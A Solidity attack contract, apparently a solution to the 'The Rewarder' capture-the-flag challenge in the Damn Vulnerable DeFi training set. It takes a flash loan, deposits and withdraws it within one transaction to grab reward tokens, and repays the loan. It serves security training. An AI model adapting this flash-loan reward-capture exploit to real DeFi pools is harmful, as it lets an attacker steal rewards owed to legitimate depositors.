pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";


contract TheRewarderAttacker {
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public flashLoanPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    constructor(address _rewarderPool, address _flashLoanPool, address _liquidityToken, address _rewardToken) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack() external {
        uint256 flashLoanBalance =
        liquidityToken.balanceOf(address(flashLoanPool));

         liquidityToken.approve(address(rewarderPool), flashLoanBalance);
         flashLoanPool.flashLoan(flashLoanBalance);

        bool success = rewardToken.transfer(msg.sender,rewardToken.balanceOf(address(this)));
        require(success, "reward transfer failed");
    }

    function receiveFlashLoan(uint256 amount) external {
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        // pay back to flash loan sender
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}